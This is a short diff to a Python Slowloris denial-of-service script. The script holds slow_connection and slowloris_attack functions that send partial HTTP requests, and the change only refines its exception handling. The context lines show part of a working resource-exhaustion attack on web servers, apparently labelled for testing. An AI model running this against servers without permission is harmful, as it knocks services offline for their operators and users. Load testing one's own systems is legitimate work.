@@ -32,8 +32,8 @@ def slow_connection(host, port, connection_id, send_interval=29, duration=60):
             s.send(b'GET / HTTP/1.1\r\n')
             s.send(b'Host: ' + host.encode() + b'\r\n')
             s.send(b'User-Agent: Slowloris-Test\r\n')
-        except:
-            print(f"[-] Connection {connection_id}: Failed to send initial data")
+        except Exception as e:
+            print(f"[-] Connection {connection_id}: Failed to send initial data: {e}")
             return False
 
         # Send data slowly
@@ -66,7 +66,7 @@ def slow_connection(host, port, connection_id, send_interval=29, duration=60):
     finally:
         try:
             s.close()
-        except:
+        except Exception:
             pass
 
 def slowloris_attack(host, port, connections=100, send_interval=29, duration=60):
